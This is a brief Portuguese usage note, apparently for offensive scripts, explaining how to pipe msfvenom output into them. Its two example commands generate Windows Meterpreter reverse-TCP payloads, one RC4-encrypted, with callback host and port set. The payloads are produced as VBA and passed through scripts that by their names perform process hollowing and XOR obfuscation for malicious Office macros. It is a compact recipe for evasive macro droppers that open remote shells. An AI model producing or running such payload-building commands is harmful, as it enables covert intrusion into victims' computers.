Usar com pipe pro output do msfvenom

exemplos:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.247 LPORT=443 -f vbapplication EXITFUNC=thread | python gen_hollow_vba.py
msfvenom -p windows/meterpreter/reverse_tcp_rc4 RC4PASSWORD=syrtain -f vbapplication EXITFUNC=thread LHOST=192.168.0.1 LPORT=443 | python3 ./xor_vba.py
